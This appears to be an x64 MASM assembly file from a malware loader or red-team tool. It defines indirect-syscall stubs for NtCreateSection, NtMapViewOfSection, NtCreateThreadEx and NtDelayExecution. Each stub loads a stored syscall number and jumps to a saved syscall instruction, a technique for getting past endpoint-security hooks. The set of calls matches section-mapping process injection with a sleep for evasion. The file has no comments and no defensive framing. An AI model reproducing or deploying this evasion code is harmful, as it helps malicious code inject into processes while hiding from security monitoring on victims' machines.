.data
EXTERN g_NtCreateSectionSSN:DWORD
EXTERN g_NtCreateSectionSyscall:QWORD
EXTERN g_NtMapViewOfSectionSSN:DWORD
EXTERN g_NtMapViewOfSectionSyscall:QWORD
EXTERN g_NtCreateThreadExSSN:DWORD
EXTERN g_NtCreateThreadExSyscall:QWORD
EXTERN g_NtDelayExecutionSSN:DWORD
EXTERN g_NtDelayExecutionSyscall:QWORD

.code

NtCreateSection PROC
    mov     r10, rcx
    mov     eax, g_NtCreateSectionSSN
    jmp     qword ptr g_NtCreateSectionSyscall
    ret
NtCreateSection ENDP

NtMapViewOfSection PROC
    mov     r10, rcx
    mov     eax, g_NtMapViewOfSectionSSN
    jmp     qword ptr g_NtMapViewOfSectionSyscall
    ret
NtMapViewOfSection ENDP

NtCreateThreadEx PROC
    mov     r10, rcx
    mov     eax, g_NtCreateThreadExSSN
    jmp     qword ptr g_NtCreateThreadExSyscall
    ret
NtCreateThreadEx ENDP

NtDelayExecutionSyscall PROC
    mov     r10, rcx
    mov     eax, g_NtDelayExecutionSSN
    jmp     qword ptr g_NtDelayExecutionSyscall
    ret
NtDelayExecutionSyscall ENDP

END
